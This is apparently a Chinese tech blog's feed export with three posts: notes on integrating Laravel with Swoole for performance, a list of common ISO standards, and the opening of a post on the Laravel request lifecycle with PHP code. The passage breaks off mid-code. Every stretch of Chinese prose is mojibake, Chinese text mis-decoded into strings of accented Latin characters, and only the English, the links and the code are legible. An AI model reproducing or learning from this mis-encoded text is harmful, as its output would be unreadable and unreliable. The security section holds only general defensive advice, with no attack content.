è¯·æ±‚çš„ç”Ÿå‘½å‘¨æœŸ</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4l6gcvhs2j30si0g1myj.jpg" alt="PHP&#39;s Lifecycle"></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨ä¸€ä¸ª PHP è¯·æ±‚ä¸­ï¼Œéœ€è¦åŠ è½½ç›¸å…³çš„ä¾èµ–æ–‡ä»¶ï¼Œå¹¶è¿›è¡Œè¯­æ³•éªŒè¯ä¸è§£æã€ç¼–è¯‘ç­‰è¿‡ç¨‹ï¼Œè€Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒI/O æ˜¯æœ€å¤§çš„æ€§èƒ½ç“¶é¢ˆï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆphpæ€§èƒ½è¾ƒä½çš„åŸå› äº†ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡<code>get_included_requires()</code>çœ‹ä¸‹ Laravel çš„ä¸€ä¸ªè¯·æ±‚éœ€è¦è½½å…¥å¤šå°‘æ–‡ä»¶ã€‚ç»å®éªŒå¾—çŸ¥ï¼Œçº¯å‡€ Laravel åŠ è½½æ–‡ä»¶æ•°é‡åœ¨ 218 ä¸ªï¼Œå¦‚æœåŠ è½½äº†å…¶ä»– vendorï¼Œæ•°é‡ä¼šæ›´å¤šã€‚</p><p>åŠ è½½äº†è¿™ä¹ˆå¤šçš„æ–‡ä»¶ï¼Œé‚£ Laravel çš„ç”Ÿå‘½å‘¨æœŸæ˜¯æ€æ ·çš„å‘¢ï¼Ÿ</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4hvdq3v5kj31840outc8.jpg" alt="Laravel&#39;s Lifecycle"></p><p>ç°åœ¨ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æ‹–æ…¢ Laravel çš„åŸå› ï¼š</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4l6l1095hj30sj0g176h.jpg" alt="What Makes Laravel Slow?"></p><p>æˆ‘æ—¢æƒ³è¦ Laravel çš„ä¼˜é›…ï¼Œåˆæƒ³è¦é«˜æ€§èƒ½ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿè¿˜å¥½ï¼Œå·²ç»æœ‰å‰äººåšäº† swoole è¿™æ ·çš„å·¥å…·ï¼Œä¸º php æ’ä¸Šç¿…è†€ï¼Œæˆ‘ä»¬è¦åšçš„å·¥ä½œå°±æ˜¯æŠŠ Laravel å’Œ swoole ç»“åˆèµ·æ¥ã€‚æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸‹ Swoole çš„æ¨¡å‹ï¼š</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4hvzuxa0sj31840osjuw.jpg" alt="Swoole&#39;s Model"></p><blockquote><p>åœ¨ Linux ä¸­ï¼Œä½¿ç”¨ Epoll æ–¹å¼å¤„ç†å¼‚æ­¥ï¼Œåœ¨ BSD ä¸­ï¼Œåˆ™ä½¿ç”¨ Kqueueã€‚</p></blockquote><p>äº†è§£äº† swoole åï¼Œæˆ‘ä»¬è‡ªç„¶ä¼šæƒ³åˆ°å¦‚ä¸‹çš„å‡ ç§é›†æˆæ–¹æ¡ˆï¼š</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4hw1t0pgyj31820osjux.jpg" alt="é›†æˆæ–¹æ¡ˆ"></p><p>ä½†æ˜¯ï¼Œæˆ‘ä»¬åœ¨é›†æˆä¸­ä¼šé‡åˆ°ä»¥ä¸‹çš„é—®é¢˜ï¼š</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4hwefdz7ij317y0osgos.jpg" alt="é›†æˆæ‰€å­˜åœ¨çš„é—®é¢˜"></p><p>æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸‹ Laravel çš„å®¹å™¨æœåŠ¡æœºåˆ¶ï¼š</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4hwfh8dkcj31820omq6a.jpg" alt="Laravel&#39;s Service Container"></p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4hwgvwzdej31860ouq72.jpg" alt="Laravel&#39;s Facades"></p><p>å¦‚æœæˆ‘ä»¬å°†é‚£äº›é‡å¤çš„å·¥ä½œåªåœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨ Laravel å®Œæˆï¼Œåœ¨ä¹‹åçš„è¯·æ±‚ä¸å°±å¯ä»¥ç›´æ¥è·³è¿‡é‚£äº›ä¸å¿…è¦çš„æµç¨‹äº†å—ï¼Ÿä½†è¿™æ ·ä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœä¸Šæ¬¡è¯·æ±‚çš„ç»“æœæœªèƒ½åŠæ—¶æ¸…é™¤ï¼Œå¯èƒ½ä¼šæ±¡æŸ“åˆ°åç»­çš„è¯·æ±‚(å°¤å…¶æ˜¯é‚£äº›é™æ€å˜é‡ã€å…¨å±€å˜é‡ç­‰ï¼‰ï¼Œé‚£æˆ‘ä»¬å°†æ¯æ¬¡è¯·æ±‚éš”ç¦»åœ¨æ²™ç®±ä¸­ä¸å°±è§£å†³äº†å—ï¼Ÿ</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4hwi82qgcj31820outc9.jpg" alt="Sandbox App Container"></p><p>ä½†å¹¶éæ‰€æœ‰çš„å®ä¾‹éƒ½éœ€è¦åœ¨æ¯æ¬¡è¯·æ±‚æ—¶åŠ è½½ï¼Œå®Œå…¨å¯ä»¥è¯»å–å…±äº«æ–‡ä»¶ï¼Œå¦‚ db, session, config, cache â€¦</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4hwjigmdgj31ha0u0tdt.jpg" alt="Instances Outside of Sanbox"></p><p>åœ¨æ²™ç®±æ¨¡å‹ä¸­ï¼Œæˆ‘ä»¬çš„è¯·æ±‚æµç¨‹å°±å˜æˆäº†è¿™æ ·ï¼š</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4hwkk3ddfj31hg0u00xf.jpg" alt="Sandbox App Container"></p><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä¼¼ä¹æˆ‘ä»¬çš„å·²ç»å®Œæˆäº†æ‰€æœ‰çš„å·¥ä½œï¼Œä½† Laravel ä¸­å¤æ‚çš„å®¹å™¨æœºåˆ¶è®©æˆ‘ä»¬è¿˜æœ‰æ–°çš„æŒ‘æˆ˜éœ€è¦å»å…‹æœï¼š</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4la15xjd3j31840ow776.jpg" alt="Redirection of App Container"></p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4la9l8l0nj30th0fgwgk.jpg" alt=""></p><p>ç°åœ¨ï¼ŒLaravel çš„ç”Ÿå‘½å‘¨æœŸå°±å˜ä¸ºäº†è¿™æ ·ï¼š<br><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4la84ngz8j317y0ouq6w.jpg" alt="Laravel&#39;s New Lifecycle"></p><p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬çœ‹ä¸‹ Laravel Swoole çš„ä¼˜åŠ¿æœ‰å“ªäº›ï¼š</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4lacgomaxj31800owae5.jpg" alt="Laravel Swoole Advantage"></p><p>ä»¥å‰ï¼Œæˆ‘ä»¬åœ¨ Laravel ä¸­è¿™æ ·ä½¿ç”¨ Websocket<br><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4lafnkbg0j31800osacv.jpg" alt="Websocket in Laravel"></p><p>ç°åœ¨ï¼Œæˆ‘ä»¬åœ¨ Laravel ä¸­è¿™æ ·ä½¿ç”¨ Websocket<br><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4lahh5grwj31840naq5n.jpg" alt="Websocket in Laravel Swoole"></p><p>åœ¨ Swoole 4.0+ ä¸­ï¼Œå¼‚æ­¥æ–¹å¼è¢«åç¨‹æ‰€å–ä»£ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åç¨‹æ¥åŠ é€Ÿåº”ç”¨</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4lakuc4nbj31860nctc8.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4lamrocopj31800newhr.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4lano5e27j317y0natb6.jpg" alt="MySQL Coroutine"></p><blockquote><p>å…³äº Laravel é›†æˆ Swoole çš„ç›¸å…³æ–‡ç« ï¼š<br>Part 1 <a href="https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-1/" target="_blank" rel="noopener">https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-1/</a><br>Part 2 <a href="https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-2/" target="_blank" rel="noopener">https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-2/</a><br>Part 3 <a href="https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-3/" target="_blank" rel="noopener">https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-3/</a><br>Part 4 <a href="https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-4/" target="_blank" rel="noopener">https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-4/</a></p></blockquote><blockquote><p>Swoft æ¡†æ¶ä¸­ç›¸å…³ä¿¡æ¯è¯´æ˜<br><a href="https://www.swoft.org/docs/2.x/zh-CN/ready/tradition.html" target="_blank" rel="noopener">Nginx + php-fpm æ¨¡å¼</a><br><a href="https://www.swoft.org/docs/2.x/zh-CN/ready/io.html" target="_blank" rel="noopener">Linux ä¸­ I/O å¤šè·¯å¤ç”¨çš„è¯´æ˜</a><br><a href="https://www.swoft.org/docs/2.x/zh-CN/ready/swoole.html" target="_blank" rel="noopener">Swoole ä¸­çš„åç¨‹</a></p></blockquote><blockquote><p>å…³äºåç¨‹çš„æ¦‚å¿µè®²è§£ï¼š<a href="https://www.itcodemonkey.com/article/4620.html" target="_blank" rel="noopener">æ¼«ç”»ï¼šä»€ä¹ˆæ˜¯åç¨‹ï¼Ÿ</a></p><p>åç¨‹ï¼Œè‹±æ–‡Coroutinesï¼Œæ˜¯ä¸€ç§æ¯”çº¿ç¨‹æ›´åŠ è½»é‡çº§çš„å­˜åœ¨ã€‚æ­£å¦‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æ‹¥æœ‰å¤šä¸ªçº¿ç¨‹ä¸€æ ·ï¼Œ<strong>ä¸€ä¸ªçº¿ç¨‹ä¹Ÿå¯ä»¥æ‹¥æœ‰å¤šä¸ªåç¨‹</strong>ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œ<strong>åç¨‹ä¸æ˜¯è¢«æ“ä½œç³»ç»Ÿå†…æ ¸æ‰€ç®¡ç†ï¼Œè€Œå®Œå…¨æ˜¯ç”±ç¨‹åºæ‰€æ§åˆ¶</strong>ï¼ˆä¹Ÿå°±æ˜¯åœ¨ç”¨æˆ·æ€æ‰§è¡Œï¼‰ã€‚</p></blockquote><blockquote><p>æ‰©å±•é˜…è¯»<br><a href="https://zhuanlan.zhihu.com/p/62766037" target="_blank" rel="noopener">ä»€ä¹ˆæ˜¯CPUå¯†é›†å‹ã€IOå¯†é›†å‹ï¼Ÿ</a><br><a href="https://www.zhihu.com/question/19903344/answer/96081382" target="_blank" rel="noopener">CPU å’Œ GPU çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</a><br>æ€»çš„æ¥è¯´ï¼Œç”±äºåŠ¨æ€è§£é‡Šå‹è¯­è¨€çš„æ‰§è¡Œæ•ˆç‡ä¸é«˜ï¼Œä½†å¼€å‘æ•ˆç‡è¾ƒé«˜ï¼ŒCPUå¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨ç­‰å¾… I/Oï¼Œå› æ­¤é€‚åˆåš I/O å¯†é›†å‹ä¸šåŠ¡ï¼Œè€Œä¸é€‚åˆåš CPU å¯†é›†å‹ä¸šåŠ¡ã€‚ç›¸åï¼Œé™æ€è¯­è¨€çš„æ‰§è¡Œæ•ˆç‡é«˜ï¼Œå› æ­¤é€‚åˆåš CPU å¯†é›†å‹ï¼Œå¦‚ C è¯­è¨€ã€‚ GPU ç›¸æ¯” CPU è€Œè¨€ï¼Œè¿ç®—èƒ½åŠ›æ›´å¼ºï¼Œä½†é€»è¾‘å¤„ç†èƒ½åŠ›è¾ƒä½ï¼Œå› æ­¤ GPU é€‚åˆåšç®€å•çš„å¯†é›†å‹è®¡ç®—ï¼Œæ¯”å¦‚å›¾å½¢æ¸²æŸ“ï¼Œå¯†ç æš´åŠ›ç ´è§£ç­‰ã€‚</p></blockquote><h2 id="5-æ‰“é€ è‡ªå·±çš„ç²‰ä¸“å®¢æœæœºå™¨äºº"><a href="#5-æ‰“é€ è‡ªå·±çš„ç²‰ä¸“å®¢æœæœºå™¨äºº" class="headerlink" title="5 æ‰“é€ è‡ªå·±çš„ç²‰ä¸“å®¢æœæœºå™¨äºº"></a>5 æ‰“é€ è‡ªå·±çš„ç²‰ä¸“å®¢æœæœºå™¨äºº</h2><p>PHPç‰ˆæœ¬çš„æœºå™¨å­¦ä¹ åº“<a href="https://github.com/php-ai/php-ml" target="_blank" rel="noopener">php-ml</a><br>ä¸€ä¸ªè¾ƒä¸ºæˆç†Ÿçš„æœºå™¨äººæ¥å£<a href="http://www.turingapi.com" target="_blank" rel="noopener">å›¾çµæœºå™¨äºº</a></p><h2 id="6-å¿«é€Ÿæ‰“é€ å®šåˆ¶åŒ–ç®¡ç†åå°"><a href="#6-å¿«é€Ÿæ‰“é€ å®šåˆ¶åŒ–ç®¡ç†åå°" class="headerlink" title="6 å¿«é€Ÿæ‰“é€ å®šåˆ¶åŒ–ç®¡ç†åå°"></a>6 å¿«é€Ÿæ‰“é€ å®šåˆ¶åŒ–ç®¡ç†åå°</h2><p>ä½¿ç”¨ <a href="https://laravelvoyager.com/" target="_blank" rel="noopener">Voyager</a> å¯ä»¥å¿«é€Ÿæ­å»ºç®¡ç†åå°ï¼Œè¯¥å·¥å…·å®ç°äº†</p><ol><li>åª’ä½“ç®¡ç†</li><li>èœå•ç®¡ç†</li><li>æ•°æ®åº“ç®¡ç†</li><li>ç«™ç‚¹è®¾ç½®</li><li>â€¦</li></ol><h2 id="7-ç½‘ç«™ä¿¡æ¯å®‰å…¨"><a href="#7-ç½‘ç«™ä¿¡æ¯å®‰å…¨" class="headerlink" title="7 ç½‘ç«™ä¿¡æ¯å®‰å…¨"></a>7 ç½‘ç«™ä¿¡æ¯å®‰å…¨</h2><ol><li>ä¸è¦ç›¸ä¿¡ä»»ä½•å¤–éƒ¨ä¿¡æ¯æ¥æº</li><li>ç®¡ç†å¹³å°ä¸è¦æ³„éœ²åœ¨ä»»ä½•ä¸€ä¸ªå‰ç«¯èŠ‚ç‚¹</li><li>ä¸è¦è®©ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶æˆä¸ºå¯æ‰§è¡Œæ–‡ä»¶</li><li>åŠ¡å¿…éµå¾ªæœ€å°æƒé™åŸåˆ™</li><li>å†™ä»£ç çš„æ—¶é—´è¿œå°äºè¢«é»‘å®¢æ”»å‡»çš„æŸå¤±</li></ol><h2 id="8-å¦‚ä½•æ­£ç¡®éƒ¨ç½²-Laravel"><a href="#8-å¦‚ä½•æ­£ç¡®éƒ¨ç½²-Laravel" class="headerlink" title="8 å¦‚ä½•æ­£ç¡®éƒ¨ç½² Laravel"></a>8 å¦‚ä½•æ­£ç¡®éƒ¨ç½² Laravel</h2><ul><li>php &gt;= 7.1</li><li>Extension<ul><li>OpenSSL</li><li>PDO</li><li>mbstring</li><li>Tokenizer</li><li>XML</li><li>Ctype</li><li>JSON</li><li>opcache</li><li>gd</li><li>bcmath</li><li>pcntl</li><li>zip</li></ul></li></ul><p>ä½¿ç”¨ Crontab æ—¶ï¼Œå°½é‡<strong>é¿å…</strong>ä½¿ç”¨æ—¶åŒºçš„åŠŸèƒ½ï¼Œ<strong>æœ€å¥½</strong>è®¾å®š cache ä½¿ç”¨ã€‚<br><a href="https://github.com/phpredis/phpredis" target="_blank" rel="noopener">phpredis</a> æ€§èƒ½æ›´å¥½ï¼Œ<a href="https://github.com/nrk/predis" target="_blank" rel="noopener">predis</a> å¼€å‘æ›´ä¾¿æ·ã€‚</p><h2 id="9-ä»£ç è´¨é‡"><a href="#9-ä»£ç è´¨é‡" class="headerlink" title="9 ä»£ç è´¨é‡"></a>9 ä»£ç è´¨é‡</h2><p>ä»£ç é£æ ¼å·¥å…·ï¼š<a href="https://github.com/FriendsOfPHP/PHP-CS-Fixer" target="_blank" rel="noopener">PHP-CS-Fixer</a>, <a href="https://github.com/squizlabs/PHP_CodeSniffer" target="_blank" rel="noopener">PHP_CodeSniffer</a><br>php é™æ€åˆ†æï¼š<a href="https://github.com/phpstan/phpstan" target="_blank" rel="noopener">phpstan</a>, <a href="https://github.com/vimeo/psalm" target="_blank" rel="noopener">psalm</a><br>CI å·¥å…·ï¼š<a href="https://travis-ci.org/" target="_blank" rel="noopener">Travis CI</a>, <a href="https://styleci.io/" target="_blank" rel="noopener">StyleCI</a></p><h1 id="LaravelConf-2017"><a href="#LaravelConf-2017" class="headerlink" title="LaravelConf 2017"></a>LaravelConf 2017</h1><hr><p><em>æœªå®Œå¾…ç»­â€¦â€¦</em></p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸ç”¨ ISO æ ‡å‡†åˆ—è¡¨</title>
      <link href="/post/standard-list/"/>
      <url>/post/standard-list/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm36p6cnj30m80b475l.jpg" alt=""></p><p>è¿™æ˜¯ä¸€ä¸ªç†µå¢çš„ä¸–ç•Œï¼Œå”¯æœ‰ç§©åºæ–¹èƒ½é‡å»ºä¸–ç•Œã€‚</p><a id="more"></a><p>è‘—åçš„å›½é™…åŒ–æ ‡å‡†ç»„ç»‡å·²ç»åˆ¶å®šäº†ä¸€äº›åˆ—çš„æ ‡å‡†ï¼Œå¸¸ç”¨çš„æ ‡å‡†å¦‚ä¸‹ï¼š</p><ul><li><a href="https://zh.wikipedia.org/wiki/ISO_639" target="_blank" rel="noopener">ISO-639</a> è¯­è¨€åç§°<ul><li>ISO 639-1 çš„ä¸­æ–‡ä¸º<code>zh</code>ï¼Œè‹±æ–‡ä¸º<code>en</code></li></ul></li><li><a href="https://zh.wikipedia.org/wiki/ISO_690" target="_blank" rel="noopener">ISO-690</a> å­¦æœ¯è®ºè‘—å‚è€ƒä¹¦ç›®æ ¼å¼</li><li><a href="https://zh.wikipedia.org/wiki/ISO_1000" target="_blank" rel="noopener">ISO-1000</a> å›½é™…å•ä½åˆ¶<ul><li>å¦‚ä¸ƒä¸ªå›½é™…åŸºæœ¬å•ä½åˆ†åˆ«æ˜¯ï¼šç±³(m)ã€åƒå…‹(kg)ã€ç§’(s)ã€å®‰åŸ¹(A)ã€å¼€å°”æ–‡(K)ã€æ‘©å°”(mol)ã€åå¾·æ‹‰(cd)</li></ul></li><li><a href="https://zh.wikipedia.org/wiki/ISO_3166-1" target="_blank" rel="noopener">ISO-3166</a> å›½å®¶åç§°ä»£ç <ul><li>ISO 3166-1 åˆ†ä¸ºäºŒä½å’Œä¸‰ä½å­—æ¯ä»£ç ï¼Œå¦‚ä¸­å›½ä¸º<code>CN</code>å’Œ<code>CHN</code>ï¼Œç¾å›½ä¸º<code>US</code>å’Œ<code>USA</code></li></ul></li><li><a href="https://zh.wikipedia.org/wiki/ISO_4217" target="_blank" rel="noopener">ISO-4217</a> è´§å¸åŠåŸºé‡‘ä»£ç <ul><li>å¦‚<code>CNY</code>ä»£è¡¨äººæ°‘å¸ã€<code>USD</code>ä»£è¡¨ç¾å…ƒã€<code>HKD</code>ä»£è¡¨æ¸¯å¸ã€<code>EUR</code>ä»£è¡¨æ¬§å…ƒã€<code>JPY</code>ä»£è¡¨æ—¥åœ†ç­‰</li></ul></li><li><a href="https://zh.wikipedia.org/wiki/ISO_5218" target="_blank" rel="noopener">ISO-5218</a> äººç±»æ€§åˆ«è¡¨ç¤º<ul><li>å¦‚ <code>1</code> ä¸ºç”·æ€§ï¼Œ<code>2</code> ä¸ºå¥³æ€§ï¼Œ<code>0</code> ä¸ºæœªçŸ¥ã€‚æˆ‘å›½èº«ä»½è¯ç¬¬åä¸ƒä½é‡‡ç”¨äº†åŒæ ·çš„è§„åˆ™æ¥è¡¨ç¤ºæ€§åˆ«ï¼šå¥‡æ•°ä¸ºç”·æ€§ï¼Œå¶æ•°ä¸ºå¥³æ€§ã€‚</li></ul></li><li><a href="https://zh.wikipedia.org/wiki/ISO_6709" target="_blank" rel="noopener">ISO-6709</a> åœ°ç†ç‚¹ä½ç½®çš„çº¬åº¦ã€ç»åº¦å’Œæµ·æ‹”é«˜åº¦</li><li><a href="https://zh.wikipedia.org/wiki/ISO_8601" target="_blank" rel="noopener">ISO-8601</a> æ—¥æœŸå’Œæ—¶é—´çš„è¡¨ç¤ºæ–¹æ³•<ul><li>å¦‚ UTC çš„æ—¥æœŸä¸æ—¶é—´è¡¨ç¤ºä¸º<code>2019-12-04T13:49:18 +00:00</code></li></ul></li><li><a href="https://zh.wikipedia.org/wiki/ISO_9000" target="_blank" rel="noopener">ISO-9000</a> å“è´¨ç®¡ç†ç³»ç»Ÿ</li></ul><p>å¦å¤–ï¼Œæˆ‘å›½ä¹Ÿæœ‰ç”±æ°‘æ”¿éƒ¨åˆ’åˆ†çš„<a href="http://www.mca.gov.cn/article/sj/xzqh/2019/" target="_blank" rel="noopener">è¡Œæ”¿åŒºåˆ’ä»£ç </a>ï¼Œè¯¥ä»£ç å³ä¸ºèº«ä»½è¯çš„å‰å…­ä½ï¼Œå¾ˆå¥½çš„è¡¨ç¤ºäº†çœå¸‚åŒºçš„å±‚çº§å…³ç³»ï¼Œå¯¹äºæ•°æ®å­˜å‚¨è¯»å–ä¹Ÿéå¸¸çš„æ–¹ä¾¿ï¼Œç›¸æ¯”å¸¸ç”¨çš„ MySQL çˆ¶å­ ID å…³è”è€Œè¨€ï¼Œè¿™ç§æ–¹å¼ä¸ä»…èƒ½ä¸èº«ä»½è¯å¯¹åº”ï¼Œè€Œä¸”å…·æœ‰æƒå¨æ€§ã€æ—¶æ•ˆæ€§å¥½ï¼Œå¯¹äºå±‚çº§å…³ç³»çš„æ„å»ºä¹Ÿéå¸¸å¿«é€Ÿæ–¹ä¾¿ã€‚ä»“åº“<a href="https://github.com/cn/GB2260" target="_blank" rel="noopener">cn/GB2260</a> æœ‰å„ç§è¯­è¨€çš„å®ç°ç‰ˆæœ¬ï¼Œå¯ä»¥ä¾¿æ·ä½¿ç”¨ã€‚</p><p>å»ºè®®åœ¨é¡¹ç›®ä¹‹åˆï¼Œå°½å¯èƒ½ä½¿ç”¨æ ‡å‡†åŒ–ï¼Œé¿å…ä½¿ç”¨è‡ªå¢ ID ç‹¬è‡ªç»´æŠ¤å…³ç³»ã€‚å¤§é‡ ID åœ¨ä¸åŒåœºæ™¯æœ‰ä¸åŒçš„å«ä¹‰ï¼Œä¼šæå¤§å¢åŠ  bug ç‡åŠç»´æŠ¤æˆæœ¬ï¼Œåƒçœå¸‚åŒºã€éƒ¨é—¨ç­‰å±‚çº§å…³ç³»ï¼Œæ¯ä¸¤ä½æ•°å­—è¡¨ç¤ºä¸€çº§ï¼Œå…¶å®¹é‡ä¸º 100ï¼Œå¦‚æœä¸¤ä½ä¸å¤Ÿç”¨ï¼Œå¯èƒ½éœ€è¦è€ƒè™‘ä¸‹å±‚çº§å…³ç³»åˆ’åˆ†æ˜¯å¦åˆç†ã€‚</p><hr><p>å‚è€ƒèµ„æ–™ï¼š</p><ol><li><a href="https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%9A%9B%E6%A8%99%E6%BA%96%E5%8C%96%E7%B5%84%E7%B9%94" target="_blank" rel="noopener">å›½é™…æ ‡å‡†åŒ–ç»„ç»‡ - Wikipedia</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ISO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel ç”Ÿå‘½å‘¨æœŸ</title>
      <link href="/post/laravel-life-cycle/"/>
      <url>/post/laravel-life-cycle/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4hvdq3v5kj31840outc8.jpg" alt=""></p><a id="more"></a><p>è¯·æ±‚è®¿é—®çš„å…¥å£æ–‡ä»¶<code>index.php</code>ä¸»è¦å®Œæˆäº†å‡ éƒ¨åˆ†å·¥ä½œï¼Œåˆ†åˆ«æ˜¯è‡ªåŠ¨åŠ è½½å‡½æ•°çš„æ·»åŠ ã€æœåŠ¡å®¹å™¨çš„å®ä¾‹åŒ–ã€æœåŠ¡æ³¨å†Œã€è·¯ç”±åŠ è½½ã€è¯·æ±‚å®ä¾‹åŒ–ä¸è·¯ç”±åˆ†å‘ã€å“åº”ç”Ÿæˆä¸å‘é€ã€‚</p><h2 id="1-å¼•å…¥ä¾èµ–"><a href="#1-å¼•å…¥ä¾èµ–" class="headerlink" title="1. å¼•å…¥ä¾èµ–"></a>1. å¼•å…¥ä¾èµ–</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/../vendor/autoload.php'</span>;</span><br></pre></td></tr></table></figure><h3 id="2-åˆ›å»º-Laravel-åº”ç”¨å®ä¾‹"><a href="#2-åˆ›å»º-Laravel-åº”ç”¨å®ä¾‹" class="headerlink" title="2. åˆ›å»º Laravel åº”ç”¨å®ä¾‹"></a>2. åˆ›å»º Laravel åº”ç”¨å®ä¾‹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$app = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">'/../bootstrap/app.php'</span>;</span><br></pre></td></tr></table></figure><p><code>$app</code>ä¸ºæœåŠ¡å®¹å™¨å®ä¾‹ï¼Œ<code>$app[&#39;router&#39;]</code>åˆ™è¡¨ç¤ºå®¹å™¨ä¸­çš„è·¯ç”±æœåŠ¡ã€‚</p><h4 id="2-1-åˆ›å»º-Laravel-å®ä¾‹"><a href="#2-1-åˆ›å»º-Laravel-å®ä¾‹" class="headerlink" title="2.1 åˆ›å»º Laravel å®ä¾‹"></a>2.1 åˆ›å»º Laravel å®ä¾‹</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$app = <span class="keyword">new</span> Illuminate\Foundation\Application(</span><br><span class="line">    $_ENV[<span class="string">'APP_BASE_PATH'</span>] ?? dirname(<span class="keyword">__DIR__</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="2-1-1-è®¾å®šé¡¹ç›®è·¯å¾„ä¿¡æ¯"><a href="#2-1-1-è®¾å®šé¡¹ç›®è·¯å¾„ä¿¡æ¯" class="headerlink" title="2.1.1 è®¾å®šé¡¹ç›®è·¯å¾„ä¿¡æ¯"></a>2.1.1 è®¾å®šé¡¹ç›®è·¯å¾„ä¿¡æ¯</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bindPathsInContainer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path'</span>, <span class="keyword">$this</span>-&gt;path());                     <span class="comment">//app_path()        app ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.base'</span>, <span class="keyword">$this</span>-&gt;basePath());            <span class="comment">//base_path()       é¡¹ç›®æ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.lang'</span>, <span class="keyword">$this</span>-&gt;langPath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.config'</span>, <span class="keyword">$this</span>-&gt;configPath());        <span class="comment">//config_path()     config ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.public'</span>, <span class="keyword">$this</span>-&gt;publicPath());        <span class="comment">//public_path()     public ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.storage'</span>, <span class="keyword">$this</span>-&gt;storagePath());      <span class="comment">//storage_path()    storage ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.database'</span>, <span class="keyword">$this</span>-&gt;databasePath());    <span 